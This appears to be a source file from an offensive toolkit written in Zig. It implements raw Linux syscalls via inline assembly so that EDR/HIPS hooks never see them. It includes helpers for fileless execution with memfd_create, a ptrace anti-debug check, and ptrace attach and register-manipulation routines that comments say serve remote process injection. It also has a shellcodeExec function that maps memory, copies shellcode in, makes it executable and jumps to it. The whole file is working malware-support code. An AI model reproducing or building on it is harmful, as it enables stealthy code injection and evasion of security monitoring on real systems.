// Direct Linux syscalls via inline assembly.
//
// Why: avoids libc wrappers and LD_PRELOAD hooks. EDR/HIPS products that
// intercept ptrace/mmap/mprotect via glibc shims see none of these calls.
//
// Covers the small set of syscalls used by injection and memory primitives.
// General I/O (read, write, open, close) should use std.os which is already
// thin over the kernel ABI on Linux.
//
// All functions compile to no-ops on non-Linux targets.

const std     = @import("std");
const builtin = @import("builtin");

const is_linux_x86_64 = (builtin.os.tag == .linux and builtin.cpu.arch == .x86_64);

// ---------------------------------------------------------------------------
// Syscall numbers — x86_64 Linux ABI
// ---------------------------------------------------------------------------
const SYS = struct {
    const mmap:      usize = 9;
    const mprotect:  usize = 10;
    const munmap:    usize = 11;
    const clone:     usize = 56;
    const execve:    usize = 59;
    const ptrace:    usize = 101;
    const memfd_create: usize = 319;
};

// ---------------------------------------------------------------------------
// Raw syscall helpers — 1 through 6 args.
// The Linux x86_64 syscall ABI: number in rax, args in rdi rsi rdx r10 r8 r9.
// Return value in rax; errno indicated by -ERANGE.
// ---------------------------------------------------------------------------
inline fn sc1(nr: usize, a1: usize) usize {
    return asm volatile ("syscall"
        : [r] "={rax}" (-> usize)
        : [n]  "{rax}" (nr),
          [a1] "{rdi}" (a1)
        : "rcx", "r11", "memory"
    );
}

inline fn sc2(nr: usize, a1: usize, a2: usize) usize {
    return asm volatile ("syscall"
        : [r] "={rax}" (-> usize)
        : [n]  "{rax}" (nr),
          [a1] "{rdi}" (a1),
          [a2] "{rsi}" (a2)
        : "rcx", "r11", "memory"
    );
}

inline fn sc3(nr: usize, a1: usize, a2: usize, a3: usize) usize {
    return asm volatile ("syscall"
        : [r] "={rax}" (-> usize)
        : [n]  "{rax}" (nr),
          [a1] "{rdi}" (a1),
          [a2] "{rsi}" (a2),
          [a3] "{rdx}" (a3)
        : "rcx", "r11", "memory"
    );
}

inline fn sc4(nr: usize, a1: usize, a2: usize, a3: usize, a4: usize) usize {
    return asm volatile ("syscall"
        : [r] "={rax}" (-> usize)
        : [n]  "{rax}" (nr),
          [a1] "{rdi}" (a1),
          [a2] "{rsi}" (a2),
          [a3] "{rdx}" (a3),
          [a4] "{r10}" (a4)
        : "rcx", "r11", "memory"
    );
}

inline fn sc6(nr: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) usize {
    return asm volatile ("syscall"
        : [r] "={rax}" (-> usize)
        : [n]  "{rax}" (nr),
          [a1] "{rdi}" (a1),
          [a2] "{rsi}" (a2),
          [a3] "{rdx}" (a3),
          [a4] "{r10}" (a4),
          [a5] "{r8}"  (a5),
          [a6] "{r9}"  (a6)
        : "rcx", "r11", "memory"
    );
}

fn isError(r: usize) bool {
    return r > std.math.maxInt(usize) - 4096; // negative errno: 0xffff...f001 and below
}

// ---------------------------------------------------------------------------
// mmap — allocate anonymous executable memory
// ---------------------------------------------------------------------------
pub const PROT = struct {
    pub const READ  : usize = 1;
    pub const WRITE : usize = 2;
    pub const EXEC  : usize = 4;
    pub const NONE  : usize = 0;
};
pub const MAP = struct {
    pub const PRIVATE   : usize = 0x02;
    pub const ANONYMOUS : usize = 0x20;
    pub const FIXED     : usize = 0x10;
};

pub fn mmap(addr: ?*anyopaque, length: usize, prot: usize, flags: usize, fd: i32, offset: usize) !*anyopaque {
    if (!is_linux_x86_64) return error.UnsupportedPlatform;
    const r = sc6(SYS.mmap, @intFromPtr(addr), length, prot, flags, @bitCast(@as(isize, fd)), offset);
    if (isError(r)) return error.SyscallFailed;
    return @ptrFromInt(r);
}

// ---------------------------------------------------------------------------
// mprotect — change memory protection flags
// ---------------------------------------------------------------------------
pub fn mprotect(addr: *anyopaque, length: usize, prot: usize) !void {
    if (!is_linux_x86_64) return error.UnsupportedPlatform;
    const r = sc3(SYS.mprotect, @intFromPtr(addr), length, prot);
    if (isError(r)) return error.SyscallFailed;
}

// ---------------------------------------------------------------------------
// munmap — release mapped memory
// ---------------------------------------------------------------------------
pub fn munmap(addr: *anyopaque, length: usize) void {
    if (!is_linux_x86_64) return;
    _ = sc2(SYS.munmap, @intFromPtr(addr), length);
}

// ---------------------------------------------------------------------------
// memfd_create — create an anonymous file descriptor (for fileless execution)
// ---------------------------------------------------------------------------
pub fn memfdCreate(name: [*:0]const u8, flags: u32) !i32 {
    if (!is_linux_x86_64) return error.UnsupportedPlatform;
    const r = sc2(SYS.memfd_create, @intFromPtr(name), @as(usize, flags));
    if (isError(r)) return error.SyscallFailed;
    return @intCast(r);
}

// ---------------------------------------------------------------------------
// ptrace — for anti-debug checks (PTRACE_TRACEME = 0)
// Returns the raw result; callers check against -1.
// ---------------------------------------------------------------------------
pub fn ptraceTraceme() isize {
    if (!is_linux_x86_64) return 0;
    const r = sc4(SYS.ptrace, 0, 0, 0, 0);
    return @bitCast(r);
}

// ---------------------------------------------------------------------------
// clone — create a new thread (flags = CLONE_VM|CLONE_FS|...|SIGCHLD etc.)
// Low-level; callers are responsible for stack setup.
// ---------------------------------------------------------------------------
pub fn clone(flags: usize, stack: usize, ptid: usize, ctid: usize, tls: usize) !usize {
    if (!is_linux_x86_64) return error.UnsupportedPlatform;
    const r = sc5: {
        // clone takes 5 args on x86_64; r10 = ptid, r8 = ctid, r9 = tls
        const result = asm volatile ("syscall"
            : [ret] "={rax}" (-> usize)
            : [nr]    "{rax}" (SYS.clone),
              [fl]    "{rdi}" (flags),
              [sp]    "{rsi}" (stack),
              [ptid]  "{rdx}" (ptid),
              [ctid]  "{r10}" (ctid),
              [tlsv]  "{r8}"  (tls)
            : "rcx", "r9", "r11", "memory"
        );
        break :sc5 result;
    };
    if (isError(r)) return error.SyscallFailed;
    return r;
}

// ---------------------------------------------------------------------------
// ptrace helpers — used by shinject for remote process injection.
// All use direct syscall to bypass LD_PRELOAD hooks on ptrace(2).
// ---------------------------------------------------------------------------

const SYS_WAIT4: usize = 61;

pub const PTRACE_TRACEME : usize = 0;
pub const PTRACE_GETREGS : usize = 12;
pub const PTRACE_SETREGS : usize = 13;
pub const PTRACE_ATTACH  : usize = 16;
pub const PTRACE_DETACH  : usize = 17;

pub const UserRegs = extern struct {
    r15: u64, r14: u64, r13: u64, r12: u64,
    rbp: u64, rbx: u64, r11: u64, r10: u64,
    r9:  u64, r8:  u64, rax: u64, rcx: u64,
    rdx: u64, rsi: u64, rdi: u64, orig_rax: u64,
    rip: u64, cs:  u64, eflags: u64,
    rsp: u64, ss:  u64, fs_base: u64, gs_base: u64,
    ds:  u64, es:  u64, fs:  u64, gs:  u64,
};

pub fn ptraceAttach(pid: u32) isize {
    if (!is_linux_x86_64) return -1;
    const r = sc4(SYS.ptrace, PTRACE_ATTACH, @as(usize, pid), 0, 0);
    return @bitCast(r);
}

pub fn ptraceDetach(pid: u32) void {
    if (!is_linux_x86_64) return;
    _ = sc4(SYS.ptrace, PTRACE_DETACH, @as(usize, pid), 0, 0);
}

pub fn ptraceGetRegs(pid: u32, regs: *UserRegs) isize {
    if (!is_linux_x86_64) return -1;
    const r = sc4(SYS.ptrace, PTRACE_GETREGS, @as(usize, pid), 0, @intFromPtr(regs));
    return @bitCast(r);
}

pub fn ptraceSetRegs(pid: u32, regs: *const UserRegs) isize {
    if (!is_linux_x86_64) return -1;
    const r = sc4(SYS.ptrace, PTRACE_SETREGS, @as(usize, pid), 0, @intFromPtr(regs));
    return @bitCast(r);
}

pub fn waitpidStop(pid: u32) void {
    if (!is_linux_x86_64) return;
    var status: u32 = 0;
    _ = sc4(SYS_WAIT4, @as(usize, pid), @intFromPtr(&status), 0, 0);
}

// ---------------------------------------------------------------------------
// shellcodeExec — map + execute a shellcode blob without touching the heap.
// Allocates RW memory, copies shellcode, flips to RX, jumps to it.
// Uses direct syscalls throughout — no libc mmap/mprotect.
// ---------------------------------------------------------------------------
pub fn shellcodeExec(sc: []const u8) !void {
    if (!is_linux_x86_64) return error.UnsupportedPlatform;

    const page_size = 4096;
    const length = (sc.len + page_size - 1) & ~(page_size - 1);

    // Allocate RW anonymous memory.
    const mem = try mmap(null, length, PROT.READ | PROT.WRITE, MAP.PRIVATE | MAP.ANONYMOUS, -1, 0);
    const ptr: [*]u8 = @ptrCast(mem);

    // Copy shellcode in.
    @memcpy(ptr[0..sc.len], sc);

    // Flip to RX.
    try mprotect(mem, length, PROT.READ | PROT.EXEC);

    // Jump.
    const fn_ptr: *const fn () callconv(.C) void = @ptrCast(mem);
    fn_ptr();

    // Caller responsible for cleanup; shellcode may not return.
    munmap(mem, length);
}
